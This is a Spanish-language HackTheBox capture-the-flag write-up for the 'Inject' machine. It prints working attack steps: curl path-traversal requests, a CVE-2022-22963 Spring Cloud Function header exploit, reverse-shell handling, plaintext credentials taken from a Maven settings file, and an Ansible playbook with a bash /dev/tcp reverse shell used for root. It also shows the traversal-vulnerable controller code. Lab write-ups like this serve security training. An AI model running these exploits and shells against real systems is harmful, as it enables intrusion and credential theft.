---
title: "Máquina Inject"
categories: ["HackTheBox", "Easy", "Linux"]
tags: ["Arbitrary File Read", "Java", "CVE-2022-22963", "Ansible Playbooks"]
logo: "/assets/writeups/inject/logo.png"
description: "Resolución de la máquina Inject de HackTheBox"
---

En esta máquina Linux encontraremos un sitio web con una ruta vulnerable a lectura arbitraria de archivos, extrañamente este aplicativo además de leernos los archivos nos lista el contenido de las carpetas en la máquina, cosa que nos facilitará hallar el proyecto Maven del servidor web que es vulnerable al CVE-2022-22963. Finalmente tomaremos control de toda la máquina abusando de una tarea Cron que ejecuta playbooks de Ansible cada ciertos minutos.

## Reconocimiento

La máquina tiene dos puertos abiertos; el SSH y el 8080 con una web.

```bash
# Nmap 7.93 scan initiated Thu Jul  6 12:58:24 2023 as: nmap -sCV -Pn -n -vvv -p 22,8080 -oN ports 10.10.11.204
Nmap scan report for 10.10.11.204
Host is up, received user-set (0.16s latency).
Scanned at 2023-07-06 12:58:24 -04 for 18s

PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKZNtFBY2xMX8oDH/EtIMngGHpVX5fyuJLp9ig7NIC9XooaPtK60FoxOLcRr4iccW/9L2GWpp6kT777UzcKtYoijOCtctNClc6tG1hvohEAyXeNunG7GN+Lftc8eb4C6DooZY7oSeO++PgK5oRi3/tg+FSFSi6UZCsjci1NRj/0ywqzl/ytMzq5YoGfzRzIN3HYdFF8RHoW8qs8vcPsEMsbdsy1aGRbslKA2l1qmejyU9cukyGkFjYZsyVj1hEPn9V/uVafdgzNOvopQlg/yozTzN+LZ2rJO7/CCK3cjchnnPZZfeck85k5sw1G5uVGq38qcusfIfCnZlsn2FZzP2BXo5VEoO2IIRudCgJWTzb8urJ6JAWc1h0r6cUlxGdOvSSQQO6Yz1MhN9omUD9r4A5ag4cbI09c1KOnjzIM8hAWlwUDOKlaohgPtSbnZoGuyyHV/oyZu+/1w4HJWJy6urA43u1PFTonOyMkzJZihWNnkHhqrjeVsHTywFPUmTODb8=
|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIUJSpBOORoHb6HHQkePUztvh85c2F5k5zMDp+hjFhD8VRC2uKJni1FLYkxVPc/yY3Km7Sg1GzTyoGUxvy+EIsg=
|   256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICZzUvDL0INOklR7AH+iFw+uX+nkJtcw7V+1AsMO9P7p
8080/tcp open  nagios-nsca syn-ack ttl 63 Nagios NSCA
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul  6 12:58:42 2023 -- 1 IP address (1 host up) scanned in 18.71 seconds
```

El sitio web, llamado "Zodd Cloud" sirve para guardar y compartir archivos en la nube desde cualquier dispositivo.

![Zodd](/assets/writeups/inject/1.png)

Tiene un panel de registro y autenticación, pero uno está en mantenimiento y otro no manda a ningún lado, pero en la barra superior a la derecha hay un enlace que te manda a una página que te permite subir solamente ciertos archivos.

![Upload](/assets/writeups/inject/2.png)

## Intrusión

Luego de subir un archivo, el sitio web te deja un enlace para verlo, y el enlace lleva un parámetro interesante

`http://10.10.11.204:8080/show_image?img=asd.png`

Si cambiamos ese img a algo que no exista, el sitio nos muestra un error

```bash
❯ curl -v 'http://10.10.11.204:8080/show_image?img=asd.jpg'
*   Trying 10.10.11.204:8080...
* Connected to 10.10.11.204 (10.10.11.204) port 8080 (#0)
> GET /show_image?img=asd.jpg HTTP/1.1
> Host: 10.10.11.204:8080
> User-Agent: curl/8.0.1
> Accept: */*
> 
< HTTP/1.1 500 
< Content-Type: application/json
< Transfer-Encoding: chunked
< Date: Thu, 06 Jul 2023 17:31:22 GMT
< Connection: close
< 
* Closing connection 0
{"timestamp":"2023-07-06T17:31:22.315+00:00","status":500,"error":"Internal Server Error","message":"URL [file:/var/www/WebApp/src/main/uploads/asd.jpg] cannot be resolved in the file system for checking its content length","path":"/show_image"}
```

El error filtra información del directorio en donde está el servidor, ahora si intentamos colocarle secuencias de navegación de directorios (../../) para apuntar a un archivo de la máquina, el servidor nos devuelve el archivo sin ningún problema

```bash
❯ curl -v 'http://10.10.11.204:8080/show_image?img=../../../../../../../etc/hosts'
*   Trying 10.10.11.204:8080...
* Connected to 10.10.11.204 (10.10.11.204) port 8080 (#0)
> GET /show_image?img=../../../../../../../etc/hosts HTTP/1.1
> Host: 10.10.11.204:8080
> User-Agent: curl/8.0.1
> Accept: */*
> 
< HTTP/1.1 200 
< Accept-Ranges: bytes
< Content-Type: image/jpeg
< Content-Length: 228
< Date: Thu, 06 Jul 2023 17:35:59 GMT
< 
127.0.0.1 localhost inject
127.0.1.1 inject

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
* Connection #0 to host 10.10.11.204 left intact
```

El servidor extrañamente también nos devuelve los archivos de una carpeta si apuntamos a una

```bash
❯ curl -v 'http://10.10.11.204:8080/show_image?img=../../../../../../../'
*   Trying 10.10.11.204:8080...
* Connected to 10.10.11.204 (10.10.11.204) port 8080 (#0)
> GET /show_image?img=../../../../../../../ HTTP/1.1
> Host: 10.10.11.204:8080
> User-Agent: curl/8.0.1
> Accept: */*
> 
< HTTP/1.1 200 
< Accept-Ranges: bytes
< Content-Type: image/jpeg
< Content-Length: 4096
< Date: Thu, 06 Jul 2023 17:37:54 GMT
< 
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

Al final del writeup diré algo de porqué esto sucede.

Buscando por los archivos del servidor, encontramos el POM (Proyect Object Model) Maven del servidor web

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
	<modelVersion>4.0.0</modelVersion>
	<parent>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-parent</artifactId>
		<version>2.6.5</version>
		<relativePath/> <!-- lookup parent from repository -->
	</parent>
	<groupId>com.example</groupId>
	<artifactId>WebApp</artifactId>
	<version>0.0.1-SNAPSHOT</version>
	<name>WebApp</name>
	<description>Demo project for Spring Boot</description>
	<properties>
		<java.version>11</java.version>
	</properties>
	<dependencies>
		<dependency>
  			<groupId>com.sun.activation</groupId>
  			<artifactId>javax.activation</artifactId>
  			<version>1.2.0</version>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-thymeleaf</artifactId>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-web</artifactId>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-devtools</artifactId>
			<scope>runtime</scope>
			<optional>true</optional>
		</dependency>

		<dependency>
			<groupId>org.springframework.cloud</groupId>
			<artifactId>spring-cloud-function-web</artifactId>
			<version>3.2.2</version>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-test</artifactId>
			<scope>test</scope>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>bootstrap</artifactId>
			<version>5.1.3</version>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>webjars-locator-core</artifactId>
		</dependency>

	</dependencies>
	<build>
		<plugins>
			<plugin>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-maven-plugin</artifactId>
				<version>${parent.version}</version>
			</plugin>
		</plugins>
		<finalName>spring-webapp</finalName>
	</build>

</project>
```

La versión de SpringBoot es vulnerable a un CVE relacionado a Spring4Shell, CVE-2022-22963. Buscando por internet podremos obtener ejemplos de como explotarlo.

Aquí se utiliza `Runtime#exec` para ejecutar comandos, dicho método solo nos permite ejecutar un único comando sin posibilidad de agregarle operadores para controlar la salida/entrada estandar como `|,<>,&`. Yo usaré curl para descargarme un archivo con una reverse shell para ejecutarlo pero tu puedes usar una forma distinta; si prefieres usar la mía te dejo a ti averiguar como lo hago juju

Subiendo una reverse shell, dándole permisos de ejecución y ejecutándola ya nos devuelve una reverse shell

`curl  -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("/tmp/s.sh")' --data-raw 'data' -v 'http://10.10.11.204:8080/functionRouter`

```bash
❯ nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.204 32814
bash: cannot set terminal process group (803): Inappropriate ioctl for device
bash: no job control in this shell
frank@inject:/$ script /dev/null -c bash # Inicia un nuevo proceso
script /dev/null -c bash
Script started, file is /dev/null
frank@inject:/$ ^Z  # CTRL + Z
[1]  + 16869 suspended  nc -lvnp 443
❯ stty raw -echo; fg # Pasa ciertos controles de la terminal al proceso
[1]  + 16869 continued  nc -lvnp 443
                                    reset xterm # Reinicia la terminal a xterm
frank@inject:/$ export TERM=xterm-256color # Establecer el tipo de terminal para obtener una consola con colores de 256bits     
frank@inject:/$ bash                                
```

Estamos como frank, y este usuario tiene un directorio personal que tiene una carpeta `.m2`, deben ser archivos de configuración de Maven

```bash
frank@inject:~$ ls -la
total 36
drwxr-xr-x 7 frank frank 4096 Jul  6 17:51 .
drwxr-xr-x 4 root  root  4096 Feb  1 18:38 ..
lrwxrwxrwx 1 root  root     9 Jan 24 13:57 .bash_history -> /dev/null
-rw-r--r-- 1 frank frank 3786 Apr 18  2022 .bashrc
drwx------ 2 frank frank 4096 Feb  1 18:38 .cache
drwx------ 3 frank frank 4096 Jul  6 17:51 .gnupg
drwxr-xr-x 3 frank frank 4096 Feb  1 18:38 .local
drwx------ 2 frank frank 4096 Jul  6 18:01 .m2
-rw-r--r-- 1 frank frank  807 Feb 25  2020 .profile
drwx------ 2 frank frank 4096 Jul  6 15:45 .ssh
frank@inject:~$ cd .m2
frank@inject:~/.m2$ ls
settings.xml
```
El archivo de ajustes contiene lo siguiente

```xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```

Tiene la estructura de un objeto servidor... que tiene credenciales de phil, y ese usuario existe en el sistema

```bash
frank@inject:~/.m2$ cat /etc/passwd | awk -F ":" '{ print $1 }'
root
...
frank
lxd
sshd
phil
...
```

Usando `su` para convertirnos en este usuario ya nos permitirá tomar la primera flag

```bash
frank@inject:~/.m2$ su phil
Password: 
phil@inject:/home/frank/.m2$ cd
phil@inject:~$ ls
user.txt
phil@inject:~$ cat user.txt
e0fc41753b255df73092ea4a3c******
```

## Escalada de privilegios

Somos miembros del grupo `staff`

```bash
phil@inject:~$ id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
```

Este grupo en Linux es utilizado mayormente por Python para que los usuarios que estén en el puedan modificar y ver ciertos archivos de Python ubicados en el directorio `/usr/local/lib/python<version>`, pero en esta máquina tenemos acceso a ciertos archivos en `/opt`

```bash
phil@inject:~$ find / -group staff 2>/dev/null
/opt/automation/tasks
/root
/var/local
/usr/local/lib/python3.8
/usr/local/lib/python3.8/dist-packages
/usr/local/lib/python3.8/dist-packages/ansible_parallel.py
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/LICENSE
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/RECORD
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/entry_points.txt
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/WHEEL
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/METADATA
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/top_level.txt
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/INSTALLER
/usr/local/lib/python3.8/dist-packages/__pycache__
/usr/local/lib/python3.8/dist-packages/__pycache__/ansible_parallel.cpython-38.pyc
/usr/local/share/fonts
/usr/local/share/fonts/.uuid
```

Esta carpeta extraña tiene un archivo YAML que parece ser un playbook de Ansible para verificar el estado del servidor web, viendo esto podemos asumir que hay una tarea Cron que ejecuta los playbooks que se encuentran aquí.

```bash
phil@inject:/opt/automation/tasks$ ls -la
total 12
drwxrwxr-x 2 root staff 4096 Jul  6 18:18 .
drwxr-xr-x 3 root root  4096 Oct 20  2022 ..
-rw-r--r-- 1 root root   150 Jul  6 18:18 playbook_1.yml
phil@inject:/opt/automation/tasks$ cat playbook_1.yml 
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started
```

Podemos crear un nuevo archivo con la misma estructura y modificar la tarea que vemos cambiándole el tipo `ansible.builtin.systemd` a `ansible.builtin.command` para hacer que se ejecute un comando del sistema como parte de la tarea, dicho comando nos va a dar una reverse shell

```yml
- hosts: localhost
  tasks:
  - name: Run a system command (Nothing malicious)
    ansible.builtin.command: "bash -c 'bash -i >& /dev/tcp/127.0.0.1/9001 0>&1'"
```

Luego de unos minutitos, Ansible nos ejecuta el playbook

```bash
phil@inject:/opt/automation/tasks$ nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 127.0.0.1 43140
bash: cannot set terminal process group (36559): Inappropriate ioctl for device
bash: no job control in this shell
root@inject:/opt/automation/tasks#
```

Estando ya como root, podremos tomar la última flag.

```bash
root@inject:/opt/automation/tasks# cd /root
root@inject:~# ls -al
total 36
drwx------  6 root staff 4096 Mar  6 13:15 .
drwxr-xr-x 18 root root  4096 Feb  1 18:38 ..
drwxr-xr-x  3 root root  4096 Jan 30 16:22 .ansible
lrwxrwxrwx  1 root root     9 Jan 24 13:56 .bash_history -> /dev/null
-rw-r--r--  1 root root  3158 Sep  1  2022 .bashrc
drwx------  2 root root  4096 Feb  1 12:26 .cache
drwx------  2 root root  4096 Feb  1 19:29 .config
drwxr-xr-x  3 root root  4096 May 25  2022 .local
-rw-r--r--  1 root root   150 Oct 20  2022 playbook_1.yml
-rw-r-----  1 root root    33 Jul  6 13:58 root.txt
root@inject:~# cat root.txt
2778c27ed0deebb7160ef3a845******
```

## Extra

El código del controlador de Spring para la ruta /show_image es el siguiente:

```java
    @RequestMapping(value = "/show_image", method = RequestMethod.GET)
    public ResponseEntity getImage(@RequestParam("img") String name) {
        String fileName = UPLOADED_FOLDER + name;
        Path path = Paths.get(fileName);
        Resource resource = null;
        try {
            resource = new UrlResource(path.toUri());
        } catch (MalformedURLException e){
            e.printStackTrace();
        }
        return ResponseEntity.ok().contentType(MediaType.IMAGE_JPEG).body(resource);
    }
```

Está usando `Path#get` para obtener el archivo y luego lo convierte en un `org.springframework.core.io.UrlResource` de Spring Boot, dicha clase hereda `org.springframework.core.io.Resource`. Supongo que por como funciona el método `getContentAsString(Charset charset)` aplicado sobre una carpeta simplemente procede a retornar el listado de archivos. No es de mencionar que usando esta falla podías obtener la user flag sin ningún RCE.
